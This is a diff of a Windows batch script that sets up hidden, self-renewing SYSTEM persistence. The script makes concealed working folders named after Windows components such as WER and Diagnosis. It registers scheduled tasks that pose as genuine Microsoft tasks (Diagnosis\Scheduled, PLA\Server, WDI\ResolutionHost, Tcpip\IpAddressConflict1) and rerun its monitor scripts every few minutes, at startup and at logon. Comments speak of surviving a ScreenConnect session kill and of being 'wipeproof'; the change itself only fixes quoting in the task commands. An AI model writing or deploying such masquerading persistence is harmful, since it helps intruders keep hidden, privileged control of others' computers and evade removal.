@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O13 - schtasks-first detach; no quote mangle
+REM OWN BUILD 20260802O14 - zero "" in task actions; schtasks-first detach
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -23,7 +23,7 @@ if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
 
 REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O13 ===
+  echo === OWN BUILD 20260802O14 ===
   echo whoami:
   whoami
   set "ELEV=0"
@@ -204,15 +204,15 @@ if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
   echo msi_cached_bytes=%%~zA>>"%LOG%"
 )
 
-REM schtasks /TR: double "" for inner quotes; paths have no spaces anyway
+REM schtasks /TR: single-level quotes only; paths never contain spaces
 schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\Scheduled" /F >nul 2>&1
-schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
+schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
 schtasks /Delete /TN "\Microsoft\Windows\PLA\Server" /F >nul 2>&1
-schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c ""%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd""" >nul 2>&1
+schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c %ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1
 schtasks /Delete /TN "\Microsoft\Windows\WDI\ResolutionHost" /F >nul 2>&1
-schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
+schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
 schtasks /Delete /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /F >nul 2>&1
-schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
+schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
 echo persist_armed_wipeproof>>"%LOG%"
 REM verify tasks really registered
 schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
